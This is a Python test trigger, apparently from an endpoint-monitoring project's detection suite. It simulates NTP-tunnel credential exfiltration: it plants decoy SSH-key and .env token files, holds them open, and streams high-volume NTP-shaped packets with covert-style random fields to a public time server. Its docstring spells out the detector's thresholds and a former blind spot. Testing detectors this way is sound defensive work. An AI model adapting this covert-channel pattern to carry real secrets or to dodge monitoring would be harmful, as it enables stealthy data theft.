#!/usr/bin/env python3
"""
Trigger ``token_exfiltration`` via an NTP tunnel (blind spot BS-6), promoted
from ``edamame_core/tests/evasion``.

Real threat: NTP tunneling tools encode stolen data in NTP packet payloads
sent to UDP port 123. Like DNS, NTP is ubiquitous system traffic that blends
in, and udp/123 to a time server used to be classified as a routine
destination -- so ``token_exfiltration``'s deterministic sustained-sensitive-
egress path never fired.

The CloudModel gate covers NTP as well as DNS: ``session_looks_non_routine``
matches ``("udp", 53 | 123)`` and applies the same
``dns_ntp_non_routine_min_outbound_bytes`` floor (262144) under the
``treat_high_volume_dns_ntp_as_non_routine`` switch. This trigger streams a
sustained, high-volume run of NTP-shaped datagrams on a single *connected*
udp/123 socket while holding a credential file open, so one 5-tuple session's
``outbound_bytes`` climbs past the floor deterministically (no anomaly flag
and no cross-session aggregation required).

Detection path (no anomaly flag required):
  single connected UDP socket -> one udp/123 session whose outbound_bytes
  climb past dns_ntp_non_routine_min_outbound_bytes
  -> session_looks_non_routine() flips true
  -> is_recent && is_external && has_sustained_egress && non_routine
  -> L7 open_files carries the credential fixture
  -> token_exfiltration (basis: sustained_sensitive_egress,
     non_routine_destination)

Each datagram is a standard NTP v4 client request (48-byte header) with
covert data packed into the transmit timestamp and a trailing extension, the
shape ntp_tunnel / MITRE ATT&CK T1071.003 covert channels take. A *single
connected* socket is used deliberately so all datagrams collapse onto one
5-tuple session whose byte count accumulates past the floor.

Reference: ntp_tunnel, MITRE ATT&CK T1071.003 (Application Layer Protocol).

Cross-platform: macOS, Linux, Windows.
"""

from __future__ import annotations

import argparse
import os
import random
import signal
import socket
import struct
import sys
import time
from pathlib import Path

from _common import (
    AGENT_TYPE_ARG_HELP,
    file_prefix_for,
    resolve_agent_type,
    state_dir_for,
    upper_prefix_for,
)

PID_FILE = "ntp_tunnel.pid"
CREATED_MARKER = "ntp_tunnel.created"

# A public NTP server IP (Google time). Pre-resolved so no udp/53 DNS lookup
# from this trigger muddies the port-53 attribution of the DNS scenarios.
DEFAULT_TARGET_IP = "216.239.35.0"   # time.google.com anycast
DEFAULT_TARGET_HOST = "time.google.com"
DEFAULT_TARGET_PORT = 123

# One NTP client request is 48 bytes + 16-byte covert extension (~64B). To
# clear the 262144-byte floor promptly and stay well past it, send a burst
# each tick.
DEFAULT_BURST = 64

KEEP_RUNNING = True


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Trigger token_exfiltration via a sustained high-volume "
                    "NTP-shaped udp/123 flow while holding a credential file open."
    )
    p.add_argument("--target-ip", default=DEFAULT_TARGET_IP,
                   help="Public NTP server IP (default: time.google.com anycast)")
    p.add_argument("--target-host", default=DEFAULT_TARGET_HOST,
                   help="Fallback hostname resolved only if --target-ip is cleared")
    p.add_argument("--target-port", type=int, default=DEFAULT_TARGET_PORT)
    p.add_argument("--interval", type=float, default=0.05,
                   help="Seconds between packet bursts")
    p.add_argument("--burst", type=int, default=DEFAULT_BURST,
                   help="NTP packets sent per burst")
    p.add_argument("--duration", type=float, default=0.0,
                   help="Runtime limit in seconds; 0 = until interrupted")
    p.add_argument("--agent-type", default=None, help=AGENT_TYPE_ARG_HELP)
    p.add_argument("--state-dir", type=Path, default=None)
    return p.parse_args()


def handle_signal(signum: int, _frame: object) -> None:
    global KEEP_RUNNING
    _ = signum
    KEEP_RUNNING = False


def ensure_state_dir(d: Path) -> None:
    d.mkdir(parents=True, exist_ok=True)


def record_created(state_dir: Path, path: Path) -> None:
    marker = state_dir / CREATED_MARKER
    existing = set()
    if marker.exists():
        existing = {l.strip() for l in marker.read_text("utf-8").splitlines() if l.strip()}
    existing.add(str(path))
    marker.write_text("\n".join(sorted(existing)) + "\n", encoding="utf-8")


def ensure_demo_sensitive_file(path: Path, content: str, state_dir: Path) -> Path:
    path = path.expanduser()
    path.parent.mkdir(parents=True, exist_ok=True)
    if path.exists():
        return path
    path.write_text(content, encoding="utf-8")
    try:
        path.chmod(0o600)
    except OSError:
        pass
    record_created(state_dir, path)
    return path


def build_ntp_packet(seq: int) -> bytes:
    """Standard NTP v4 client request (48 bytes) with covert data in the
    transmit timestamp and a trailing 16-byte extension."""
    header = struct.pack("!BBBb", 0x23, 0, 6, -20)  # LI=0, VN=4, Mode=3
    header += struct.pack("!II", 0, 0)   # Root Delay, Root Dispersion
    header += struct.pack("!I", 0)       # Reference ID
    header += struct.pack("!II", 0, 0)   # Reference Timestamp
    header += struct.pack("!II", 0, 0)   # Origin Timestamp
    header += struct.pack("!II", 0, 0)   # Receive Timestamp
    header += struct.pack("!II", seq & 0xFFFFFFFF, random.randint(0, 0xFFFFFFFF))
    covert = struct.pack(
        "!IIII",
        seq,
        random.randint(0, 0xFFFFFFFF),
        random.randint(0, 0xFFFFFFFF),
        random.randint(0, 0xFFFFFFFF),
    )
    return header + covert


def resolve_target(target_ip: str, target_host: str) -> str:
    if target_ip.strip():
        return target_ip.strip()
    return socket.gethostbyname(target_host)


def main() -> int:
    args = parse_args()
    agent_type = resolve_agent_type(args.agent_type)
    if args.state_dir is None:
        args.state_dir = state_dir_for(agent_type)
    state_dir = args.state_dir
    ensure_state_dir(state_dir)

    pfx = file_prefix_for(agent_type)
    upfx = upper_prefix_for(agent_type)
    ssh_key = ensure_demo_sensitive_file(
        Path(f"~/.ssh/{pfx}_ntp_tunnel_key"),
        f"-----BEGIN OPENSSH PRIVATE KEY-----\n{upfx}_NTP_TUNNEL_PAYLOAD\n"
        "-----END OPENSSH PRIVATE KEY-----\n",
        state_dir,
    )
    env_path = ensure_demo_sensitive_file(
        Path(f"~/.env_{pfx}_ntp_tunnel"),
        f"SECRET_TOKEN={pfx}_ntp_tunnel_value\n",
        state_dir,
    )
    open_paths = [ssh_key, env_path]

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    pid_file = state_dir / PID_FILE
    pid_file.write_text(f"{os.getpid()}\n", encoding="utf-8")

    handles = []
    for p in open_paths:
        if p.exists():
            h = p.open("rb")
            h.read(1)
            h.seek(0)
            handles.append(h)

    try:
        target_ip = resolve_target(args.target_ip, args.target_host)
    except OSError as exc:
        print(f"ERROR: cannot resolve NTP server {args.target_host}: {exc}",
              file=sys.stderr)
        return 1

    # A single *connected* UDP socket: fixed src port -> one 5-tuple session
    # whose outbound_bytes accumulate past the non-routine floor.
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect((target_ip, args.target_port))
    except OSError as exc:
        print(f"ERROR: cannot connect udp socket to "
              f"{target_ip}:{args.target_port}: {exc}", file=sys.stderr)
        return 1

    print(f"trigger_ntp_tunnel.py active  pid={os.getpid()}")
    for p in open_paths:
        print(f"  open_path={p}")
    print(f"  target={target_ip}:{args.target_port} (udp/123, single connected socket)")
    print(f"  burst={max(args.burst, 1)} interval={max(args.interval, 0.01)}s "
          f"duration={max(args.duration, 0.0)}s")
    print("  gate=treat_high_volume_dns_ntp_as_non_routine "
          "floor=dns_ntp_non_routine_min_outbound_bytes (262144)")
    print("  threat=NTP covert-channel exfiltration (MITRE T1071.003)")
    print("  stop_with=Ctrl-C or python3 cleanup.py")
    sys.stdout.flush()

    started = time.monotonic()
    duration = max(args.duration, 0.0)
    interval = max(args.interval, 0.01)
    burst = max(args.burst, 1)
    seq = 0
    sent_bytes = 0

    try:
        while KEEP_RUNNING:
            if duration > 0 and (time.monotonic() - started) >= duration:
                break
            for _ in range(burst):
                seq += 1
                try:
                    sent_bytes += sock.send(build_ntp_packet(seq))
                except OSError:
                    # Keep the SAME socket on a transient error (recreating
                    # would split the 5-tuple and reset the per-session count).
                    break
            try:
                sock.setblocking(False)
                try:
                    while True:
                        if not sock.recv(4096):
                            break
                except (BlockingIOError, OSError):
                    pass
                finally:
                    sock.setblocking(True)
            except OSError:
                pass

            if seq % 500 == 0:
                elapsed = time.monotonic() - started
                print(f"  packets={seq} sent_bytes={sent_bytes} elapsed={elapsed:.0f}s")
                sys.stdout.flush()

            time.sleep(interval)
    finally:
        print(f"  total_packets={seq} total_sent_bytes={sent_bytes}")
        try:
            sock.close()
        except OSError:
            pass
        for h in handles:
            try:
                h.close()
            except OSError:
                pass
        try:
            pid_file.unlink()
        except FileNotFoundError:
            pass

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
